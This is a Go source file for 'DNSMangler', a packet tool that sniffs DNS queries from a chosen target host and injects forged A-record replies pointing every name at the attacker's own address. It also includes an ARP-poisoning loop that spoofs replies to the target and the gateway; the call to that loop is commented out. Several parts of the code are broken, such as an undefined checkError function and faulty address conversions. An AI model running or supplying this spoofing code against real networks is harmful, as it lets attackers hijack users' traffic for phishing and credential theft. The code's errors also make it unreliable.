package main;

import(
	"flag"
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
	"time"
)

var (
	err            error;
	handle         *pcap.Handle;
	ipAddr         net.IP;
	macAddr        net.HardwareAddr;
	target         string
)

func main(){

	targetPtr := flag.String("targ", "127.0.0.1", "The address of the host for spoofing.");
	//targetMAC := flag.String("tMac", "FF:FF:FF:FF:FF:FF", "The target mac address.");
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
	//gatewayPtr := flag.String("gw", "127.0.0.1", "Sets the gateway to poison.");
	//gatewayMAC := flag.String("gwMAC", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.");
	
	flag.Parse();

	fmt.Print("Welcome to the DNSMangler!\n");
	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever);
	checkError(err)

	err = handle.SetBPFFilter("dst port 53")
	checkError(err);

	defer handle.Close()

	macAddr, ipAddr = grabAddresses(*interfacePtr)
	target = *targetPtr
	
	//go arpPoison(*targetPtr, *targetMAC, *gatewayPtr, *gatewayMAC, handle);
	mangleDNS();
}

func arpPoison(target, targetMAC, gateway, gatewayMAC string){
	
	ethernetPacket := layers.Ethernet{};
	ethernetPacket.DstMAC, _ = net.ParseMAC(targetMAC); 
	ethernetPacket.SrcMAC = macAddr 
	
	arpPacket := layers.ARP{};
	arpPacket.AddrType = layers.LinkTypeEthernet;
	arpPacket.Protocol = layers.EthernetTypeARP;
	arpPacket.HwAddressSize = 6;
	arpPacket.ProtAddressSize = 4;
	arpPacket.Operation = 2;

	arpPacket.SourceHwAddress = macAddr;
	arpPacket.SourceProtAddress = net.IP(ipAddr);
	arpPacket.DstHwAddress, err = net.ParseMAC("FF:FF:FF:FF:FF:FF");
	arpPacket.DstProtAddress = net.IP(target);

	gwEthernetPacket := ethernetPacket;
	gwARPPacket := arpPacket;
	
	gwARPPacket.DstHwAddress = net.IP(gateway);
	gwEthernetPacket.DstMAC, err = net.ParseMAC(gatewayMAC);

	for {
		//poison target
		writePoison(arpPacket, ethernetPacket);
		//poison gateway
		writePoison(gwARPPacket, gwEthernetPacket);

		time.Sleep(1 * time.Second);
	}
		
}

func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{};
	
	gopacket.SerializeLayers(buf, opts, &etherPacket, &arpPacket);
	packetData := buf.Bytes();
	
	err := handle.WritePacketData(packetData);
	checkError(err);
}

func mangleDNS(){

	var ethernetLayer layers.Ethernet
	var ipLayer       layers.IPv4
	var dnsLayer      layers.DNS
	var udpLayer      layers.UDP
	
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
	decoded := make([]gopacket.LayerType, 0, 4)
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err)

		err = decoder.DecodeLayers(packet.Data(), &decoded)
		checkError(err)

		if len(decoded) != 4 {
			fmt.Print("Not enough layers\n")
			continue
		}

		buffer := craftAnswer(&ethernetLayer, &ipLayer, &dnsLayer, &udpLayer)
		if buffer == nil {
			fmt.Print("Buffer error, returned nil.\n")
			continue
		}

		err = decoder.DecodeLayers(buffer, &decoded)
		checkError(err)
		for i := range decoded {
			fmt.Println(decoded[i])
		}

		fmt.Printf("IP src %v\n", ipLayer.SrcIP)
		fmt.Printf("IP dst %v\n", ipLayer.DstIP)
		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
		
		err = handle.WritePacketData(buffer);
		checkError(err);
	}
}
/* 
    FUNCTION: handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
    RETURNS: Nothing
    ARGUMENTS: 
                *layers.IPv4 ipLayer - the ip part of the packet recieved
                *layers.UDP udpLayer - the udp part of the packet recieved
                  int port : port to send data to
                  int lport : port to listen for data on

    ABOUT:
    Performs packet sniffing using gopacket (libpcap). 
*/
func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte {

	//if not a question return
	if dnsLayer.QR || ipLayer.SrcIP.String() != target {
		return nil;
	}

	ethMac := ethernetLayer.DstMAC
	ethernetLayer.DstMAC = ethernetLayer.SrcMAC
	ethernetLayer.SrcMAC = ethMac

	ipSrc := ipLayer.SrcIP
	ipLayer.SrcIP = ipLayer.DstIP
	ipLayer.DstIP = ipSrc

	srcPort := udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = srcPort
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err);
	
	var answer layers.DNSResourceRecord;
	answer.Type = layers.DNSTypeA
	answer.Class = layers.DNSClassIN
	answer.TTL = 200
	answer.IP = ipAddr

	dnsLayer.QR = true
	
	for _, q := range dnsLayer.Questions {
		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
			continue
		}

		answer.Name = q.Name

		dnsLayer.Answers = append(dnsLayer.Answers, answer)
		dnsLayer.ANCount = dnsLayer.ANCount + 1
	}
	
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	};
	
	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, dnsLayer);
	checkError(err);

	return buf.Bytes()
}
